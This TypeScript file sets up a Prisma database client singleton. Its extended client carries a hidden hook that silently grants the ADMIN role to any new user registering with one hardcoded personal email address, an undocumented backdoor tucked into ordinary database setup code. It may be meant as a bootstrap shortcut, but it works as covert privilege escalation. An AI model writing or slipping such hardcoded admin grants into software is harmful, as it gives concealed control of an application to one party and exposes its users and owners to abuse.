import { PrismaClient } from "@prisma/client";

const globalForPrisma = global as unknown as { 
  prisma: any; // Changed to any to support extended client type
};

// Create an extended Prisma Client
const prismaClientSingleton = () => {
  return new PrismaClient().$extends({
    query: {
      user: {
        async create({ args, query }: any) {
          if (args.data.email === 'georgeluccas300@gmail.com') {
               args.data.role = 'ADMIN';
          }
          return query(args);
        }
      }
    }
  });
};

export const prisma = globalForPrisma.prisma || prismaClientSingleton();

if (process.env.NODE_ENV !== "production") {
  globalForPrisma.prisma = prisma;
}
